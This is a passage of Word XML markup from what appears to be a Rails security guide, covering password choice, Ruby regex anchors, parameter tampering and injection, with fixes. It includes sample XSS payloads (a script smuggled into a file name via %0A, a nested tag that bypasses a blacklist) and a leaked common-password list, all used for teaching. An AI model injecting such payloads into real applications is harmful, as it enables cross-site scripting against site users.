        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6BFB4C22" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="06079567" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1879197977"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.filter_parameters &lt;&lt; :password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="22A4ABA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.5 Good Passwords</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22596CA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Do you find it hard to remember all your passwords? Don’t write them down, but use the initial letters of each word in an easy to remember sentence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA9ED60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Bruce Schneier, a security technologist, </w:t>
      </w:r>
      <w:hyperlink r:id="rId715" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>has analyzed</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 34,000 real-world user names and passwords from the MySpace phishing attack mentioned </w:t>
      </w:r>
      <w:hyperlink r:id="rId716" w:anchor="examples-from-the-underground" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>below</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21046A3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416CBBB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today’s passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="036A4A9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>first letters of a sentence that you can easily remember</w:t>
      </w:r>
      <w:r>
        <w:t>. For example “The quick brown fox jumps over the lazy dog” will be “Tqbfjotld”. Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBCB7BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.6 Regular Expressions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E16D35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>A common pitfall in Ruby’s regular expressions is to match the string’s beginning and end by ^ and $, instead of \A and \z.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54274FC9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books make this wrong. So how is this a security threat? Imagine you have a File model and you validate the file name by a regular expression like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5568"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="787EC84B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="032CC171" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>File</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6705C359" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  validates :name, :format</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; /^[\w\.\-\+]+$/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6324091F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="32D6E3E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This means, upon saving, the model will validate the file name to consist only of alphanumeric characters, dots, + and -. And the programmer added ^ and $ so that file name will contain these characters from the beginning to the end of the string. However, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">in Ruby ^ and $ matches the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>line</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> beginning and line end</w:t>
      </w:r>
      <w:r>
        <w:t>. And thus a file name like this passes the filter without problems:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4C00AB34" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78F0E150" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1384986450"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>file.txt%0A&lt;script&gt;alert('hello')&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="50B4CE85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Whereas %0A is a line feed in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> encoding, so Rails automatically converts it to “file.txt\n&lt;script&gt;alert(‘hello’)&lt;/script&gt;”. This file name passes the filter because the regular expression matches – up to the line end, the rest does not matter. The correct expression should read:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5F63D9F4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43639BFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2081557697"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/\A[\w\.\-\+]+\z/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="14AD4374" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>7.7 Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56017C80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12121FA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most common parameter that a user might tamper with, is the id parameter, as in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://www.domain.com/project/1</w:t>
      </w:r>
      <w:r>
        <w:t>, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4248"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4A7C35AC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C552BBF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="506212492"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@project</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Project.find(params[:id])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A23E7EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>query the user’s access rights, too</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6048"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7D7C246B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E84F371" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="847250901"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@project</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @current_user.projects.find(params[:id])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E8E0C24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7490E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Don’t be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form’s hidden fields. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values</w:t>
      </w:r>
      <w:r>
        <w:t>. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E6CC5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>8 Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553B4109" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3ADF18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368D79FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 Whitelists versus Blacklists</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8D58FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>When sanitizing, protecting or verifying something, whitelists over blacklists.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059BD4B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A blacklist can be a list of bad e-mail addresses, non-public actions or bad </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tags and so on. Although, sometimes it is not possible to create a whitelist (in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SPAM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> filter, for example), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>prefer to use whitelist approaches</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="463BBB5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="342"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Use before_filter :only =&gt; […] instead of :except =&gt; […]. This way you don’t forget to turn it off for newly added actions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8F7436" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="342"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Use attr_accessible instead of attr_protected. See the mass-assignment section for details</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266A39E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="342"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t>). See below for details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543AFC66" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="342"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Don’t try to correct user input by blacklists: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F1AD78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="342"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>This will make the attack work: “&lt;sc&lt;script&gt;ript&gt;”.gsub(“&lt;script&gt;”, "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5398BB52" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="342"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>But reject malformed input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255713D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Whitelists are also a good approach against the human factor of forgetting something in the blacklist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A07A18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F78A888" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E663FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.2.1 Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B96C10B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
